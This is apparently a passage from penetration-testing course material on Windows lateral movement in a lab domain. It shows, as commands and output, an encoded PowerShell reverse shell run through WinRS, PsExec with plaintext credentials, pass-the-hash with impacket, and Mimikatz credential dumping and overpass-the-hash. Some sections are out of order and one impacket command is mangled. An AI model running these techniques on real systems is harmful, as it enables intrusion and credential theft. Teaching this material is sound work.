# Executing Commands Remotely via WinRS

The output confirms that we have successfully executed the commands remotely on FILES04.

**References:**
- [Wikipedia, 2022](https://en.wikipedia.org/wiki/WS-Management)
- [Microsoft, 2022](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs)

**Copyright Information:**
- PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 782
- Made in Morocco
- Penetration Testing with Kali Linux

For WinRS to function, the domain user must be a member of the Administrators or Remote Management Users group on the target host.

To convert this technique into a full lateral movement scenario, replace the previous commands with the base64-encoded reverse-shell payload generated earlier.

```powershell
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD... HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

### Running the Reverse-Shell Payload through WinRS

After setting up a Netcat listener, executing the above command results in a reverse shell from FILES04.

```bash
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 65107
PS C:\Users\jen> hostname
FILES04
PS C:\Users\jen> whoami
corp\jen
```

### Verifying the Origin of the WinRS Reverse-Shell

PowerShell also includes built-in WinRM capabilities called PowerShell remoting, which can be invoked using the `New-PSSession` cmdlet by providing the target host's IP and credentials in a credential object format.

```powershell
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $secureString;
PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential

Id Name           ComputerName    ComputerType    State         ConfigurationName     Availability
-- ----           ------------    ------------    -----         -----------------     ------------
1  WinRM1         192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell  Available
```

### Establishing a PowerShell Remote Session via WinRM

To interact with the session, use the `Enter-PSSession` cmdlet followed by the session ID.

```powershell
PS C:\Users\jeff> Enter-PSSession 1
[192.168.50.73]: PS C:\Users\jen\Documents> whoami
corp\jen
[192.168.50.73]: PS C:\Users\jen\Documents> hostname
FILES04
```

### PsExec for Lateral Movement

PsExec is a versatile tool part of the SysInternals suite, developed by Mark Russinovich. It replaces telnet-like applications and provides remote execution of processes on other systems through an interactive console.

#### Requirements for Lateral Movement with PsExec:
- The authenticating user must be part of the local Administrators group.
- The ADMIN$ share must be available.
- File and Printer Sharing must be enabled.

These requirements are typically met by default on modern Windows Server systems.

#### Using PsExec for Lateral Movement

Assume RDP access as the offsec local administrator on CLIENT74, where the clear-text password was discovered on FILES04. Transfer PsExec to the compromised machine and run the 64-bit version from C:.

```powershell
PS C:\Tools\SysinternalsSuite> ./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04
C:\Windows\system32>whoami
corp\jen
```

### Pass the Hash (PtH) Technique

The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user’s NTLM hash instead of the plaintext password. This method works for Active Directory domain accounts and the built-in local administrator account but not for Kerberos authentication.

#### Tools and Frameworks Supporting PtH:
- Metasploit's PsExec
- Passing-the-hash toolkit
- Impacket

#### Example: Using Impacket wmiexec

```bash
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425EPI:EMAIL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04
C:\>whoami
files04\administrator
```

### Overpass the Hash

Overpass the hash leverages an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) and then a Ticket Granting Service (TGS).

#### Simulating Cached Credentials

Log in to the Windows 10 CLIENT76 machine as jeff and run a process as jen, prompting authentication. Use Mimikatz to dump the cached password hashes.

```mimikatz
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1142030 (00000000:00116d0e)
Session : Interactive from 0
User Name : jen
Domain : CORP
Logon Server : DC1
Logon Time : 2/27/2023 7:43:20 AM
SID : S-1-5-21-1987370270-658905905-1781884369-1124
msv :
[00000003] Primary
* Username : jen
* Domain : CORP
* NTLM : 369def79d8372408bf6e93364cc93075
* SHA1 : faf35992ad0df4fc418af543e5f4cb08210830d4
* DPAPI : ed6686fedb60840cd49b5286a7c08fa4
tspkg :
wdigest :
* Username : jen
* Domain : CORP
* Password : (null)
kerberos :
* Username : jen
* Domain : CORP.COM
* Password : (null)
ssp :
credman :
```

#### Creating a Process with a Different User's NTLM Hash

Use Mimikatz to create a new PowerShell process in the context of jen.

```mimikatz
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
user : jen
domain : corp.com
program : powershell
impers. : no
NTLM : 369def79d8372408bf6e93364cc93075
| PID 8716
| TID 8348
| LSA Process is now R/W
| LUID 0 ; 16534348 (00000000:00fc4b4c)
\_ msv1_0 - data copy @ 000001F3D5C69330 : OK !
\_ kerberos - data copy @ 000001F3D5D366C8
\_ des_cbc_md4 -> null
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ *Password replace @ 000001F3D5C63B68 (32) -> null
```

#### Listing Kerberos Tickets

```powershell
PS C:\Windows\system32> klist
Current LogonId is 0:0x1583ae
Cached Tickets: (0)
```

This output shows the newly created PowerShell session, allowing us to execute commands as jen.